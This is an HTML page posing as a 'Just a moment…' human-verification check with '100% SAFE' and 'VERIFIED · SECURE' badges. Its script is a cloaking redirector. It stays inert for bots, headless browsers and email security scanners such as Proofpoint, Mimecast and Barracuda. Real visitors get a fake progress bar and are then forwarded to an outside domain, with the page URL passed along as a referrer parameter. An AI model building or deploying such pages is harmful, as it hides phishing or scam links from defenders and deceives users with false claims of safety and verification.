<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta name="referrer" content="strict-origin-when-cross-origin">
<title>Just a moment…</title>
<style>
  :root{--a:#84cc16;--b:#22c55e;--ink:#0f1c0a;--soft:#f4faf0;--line:#e3efd9}
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
    background:linear-gradient(160deg,#f7fdf3,#e6f7d9 60%,#d4f0c0);
    color:var(--ink);display:flex;align-items:center;justify-content:center;
    padding:22px;min-height:100dvh;overflow:hidden;
  }
  .stage{
    width:100%;max-width:430px;background:#fff;border:1px solid var(--line);
    border-radius:26px;padding:34px 26px 24px;text-align:center;
    box-shadow:0 24px 60px rgba(60,120,20,.14);position:relative;
    animation:appear .5s ease;
  }
  @keyframes appear{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
  .pill{
    position:absolute;top:-13px;left:50%;transform:translateX(-50%);
    background:var(--a);color:#fff;font-size:10.5px;font-weight:800;
    letter-spacing:2px;padding:5px 14px;border-radius:99px;
    box-shadow:0 6px 16px rgba(132,204,22,.35);
  }
  .hero{font-size:58px;line-height:1;margin:4px 0 10px;display:inline-block;animation:bob 2s ease-in-out infinite}
  @keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
  .title{font-size:23px;font-weight:800;letter-spacing:-.4px;margin-bottom:8px;color:var(--ink)}
  .desc{font-size:14px;line-height:1.55;color:#4f6a3f;margin-bottom:22px;max-width:32ch;margin-left:auto;margin-right:auto}
  .stripe{height:8px;background:var(--soft);border:1px dashed var(--line);border-radius:99px;overflow:hidden;margin-bottom:13px}
  .stripe span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--a),var(--b));transition:width .25s ease}
  .read{font-size:13px;color:#6b8a58;min-height:20px}
  .go{
    width:100%;margin-top:20px;padding:17px;border:0;border-radius:15px;
    background:linear-gradient(135deg,var(--a),var(--b));color:#fff;
    font-family:inherit;font-size:16.5px;font-weight:800;cursor:pointer;
    min-height:58px;display:none;letter-spacing:.2px;
    box-shadow:0 14px 30px rgba(34,197,94,.32);
  }
  .go:active{transform:scale(.985)}
  .go.on{display:block;animation:appear .3s ease}
  .note{margin-top:15px;font-size:11px;color:#a0b591;letter-spacing:.6px}
</style>
</head>
<body>
<main class="stage">
  <div class="pill">100% SAFE</div>
  <div class="hero">🍀</div>
  <h1 class="title">Lucky you — almost there!</h1>
  <p class="desc">We're just making sure you're a real person.<br>One quick second and you're in.</p>
  <div class="stripe"><span id="pa"></span></div>
  <div class="read" id="sa">Getting ready…</div>
  <button class="go" id="ba" type="button">Let's go →</button>
  <div class="note">🔒 VERIFIED · FAST · SECURE</div>
</main>
<script>
const CONFIG={targetUrl:"https://beast.beastbox.pro",refParam:"referrerCF",minDelay:1500,maxDelay:2500};
(function(){
  "use strict";
  const bar=document.getElementById('pa'),st=document.getElementById('sa'),btn=document.getElementById('ba');
  const ua=navigator.userAgent||"";
  const pats=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
  for(const p of pats){if(p.test(ua))return;}
  if(navigator.webdriver===true)return;
  let acted=false;
  ['touchstart','pointerdown','mousemove','keydown','scroll','click'].forEach(e=>window.addEventListener(e,()=>{acted=true},{passive:true}));
  const T=CONFIG.minDelay+Math.random()*(CONFIG.maxDelay-CONFIG.minDelay),S=performance.now();let r=false;
  function step(){const e=performance.now()-S,p=Math.min(100,e/T*100);bar.style.width=p+"%";
    if(e<T){requestAnimationFrame(step);return;}
    if(r)return;r=true;bar.style.width="100%";
    st.textContent=acted?"You're verified ✓":"Tap the button to continue";
    btn.classList.add('on');}
  requestAnimationFrame(step);
  function build(){try{const u=new URL(CONFIG.targetUrl);u.searchParams.set(CONFIG.refParam,location.href);return u.toString();}catch(e){const s=CONFIG.targetUrl.includes('?')?'&':'?';return CONFIG.targetUrl+s+CONFIG.refParam+'='+encodeURIComponent(location.href);}}
  let d=false;
  function go(){if(d)return;d=true;btn.disabled=true;btn.style.opacity=".6";st.textContent="Redirecting…";
    const u=build(),a=document.createElement('a');a.href=u;a.target='_self';a.style.display='none';document.body.appendChild(a);
    try{a.click();}catch(e){try{window.location.href=u;}catch(_){window.location.assign(u);}}
    setTimeout(()=>{try{a.remove();}catch(_){}},300);}
  btn.addEventListener('click',e=>{e.preventDefault();go();});
})();
</script>
</body>
</html>
